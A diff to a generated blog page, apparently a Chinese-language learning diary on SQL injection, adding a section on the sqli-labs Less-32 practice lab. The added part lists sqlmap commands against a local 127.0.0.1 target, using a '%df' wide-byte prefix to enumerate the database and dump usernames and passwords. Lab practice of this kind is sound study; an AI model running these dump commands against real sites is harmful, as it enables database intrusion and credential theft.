@@ -43,8 +43,13 @@
 <meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users/Crush/AppData/Roaming/Typora/typora-user-images/image-20221024205034782.png">
 <meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users/Crush/AppData/Roaming/Typora/typora-user-images/image-20221024214452782.png">
 <meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users/Crush/AppData/Roaming/Typora/typora-user-images/image-20221025170248136.png">
+<meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025223901864.png">
+<meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025233909902.png">
+<meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234029915.png">
+<meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234117130.png">
+<meta property="og:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234322626.png">
 <meta property="article:published_time" content="2022-10-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-25T09:02:51.342Z">
+<meta property="article:modified_time" content="2022-10-25T15:43:35.264Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users/Crush/AppData/Roaming/Typora/typora-user-images/image-20221023213612187.png">
@@ -266,7 +271,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.5k words
+          4.9k words
         
       </span>
     
@@ -277,7 +282,7 @@
         
         
         
-          38 mins
+          41 mins
         
       </span>
     
@@ -457,6 +462,19 @@
 </li>
 </ul>
 <p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221025170248136.png" srcset="/img/loading.gif" lazyload alt="image-20221025170248136"></p>
+<ul>
+<li><p>sqli32 </p>
+<p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025223901864.png" srcset="/img/loading.gif" lazyload alt="image-20221025223901864"></p>
+<p>sqlmap简单使用</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> –current-db</p>
+<p>查库名为 <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025233909902.png" srcset="/img/loading.gif" lazyload alt="image-20221025233909902"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security –tables<img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234029915.png" srcset="/img/loading.gif" lazyload alt="image-20221025234029915"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security -T users –columns<img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234117130.png" srcset="/img/loading.gif" lazyload alt="image-20221025234117130"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-32/?id=1%EF%BF%BD&quot;">http://127.0.0.1/sqli/Less-32/?id=1%df&quot;</a> -D security -T users -C id,username,password –dump</p>
+<p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/image-20221025234322626.png" srcset="/img/loading.gif" lazyload alt="image-20221025234322626"></p>
+<p>sqlmap真好用~~</p>
+</li>
+</ul>
 
                 
               </div>
